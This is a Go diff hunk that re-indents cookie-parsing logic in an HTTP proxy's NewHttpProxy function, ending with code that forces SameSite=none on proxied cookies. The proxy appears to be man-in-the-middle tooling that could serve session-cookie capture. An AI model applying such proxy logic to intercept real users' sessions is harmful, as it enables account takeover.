@@ -1431,29 +1431,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				hasPartitioned := strings.Contains(rawCookie, "; Partitioned")
 
 				// 解析 cookie
-			// 如果 cookie 包含 Domain 属性，直接使用 parseCookieLoose（http.ParseCookie 对某些格式解析不正确）
-			var parsedCookies []*http.Cookie
-			if regexp.MustCompile(`(?i);\s*domain=`).MatchString(rawCookie) {
-				ck, err := parseCookieLoose(rawCookie)
-				if err != nil {
-					log.Debug("COOKIE_LOOSE_PARSE_FAILED: %v", err)
-					resp.Header.Add("Set-Cookie", rawCookie)
-					continue
-				}
-				parsedCookies = []*http.Cookie{ck}
-			} else {
-				ck, err := http.ParseSetCookie(rawCookie)
-				if err != nil {
-					log.Debug("COOKIE_PARSE_FAILED: %v, trying loose parser", err)
-					ck, err = parseCookieLoose(rawCookie)
+				// 如果 cookie 包含 Domain 属性，直接使用 parseCookieLoose（http.ParseCookie 对某些格式解析不正确）
+				var parsedCookies []*http.Cookie
+				if regexp.MustCompile(`(?i);\s*domain=`).MatchString(rawCookie) {
+					ck, err := parseCookieLoose(rawCookie)
 					if err != nil {
 						log.Debug("COOKIE_LOOSE_PARSE_FAILED: %v", err)
 						resp.Header.Add("Set-Cookie", rawCookie)
 						continue
 					}
+					parsedCookies = []*http.Cookie{ck}
+				} else {
+					ck, err := http.ParseSetCookie(rawCookie)
+					if err != nil {
+						log.Debug("COOKIE_PARSE_FAILED: %v, trying loose parser", err)
+						ck, err = parseCookieLoose(rawCookie)
+						if err != nil {
+							log.Debug("COOKIE_LOOSE_PARSE_FAILED: %v", err)
+							resp.Header.Add("Set-Cookie", rawCookie)
+							continue
+						}
+					}
+					parsedCookies = []*http.Cookie{ck}
 				}
-				parsedCookies = []*http.Cookie{ck}
-			}
 
 				for _, ck := range parsedCookies {
 					// add SameSite=none for every received cookie, allowing cookies through iframes
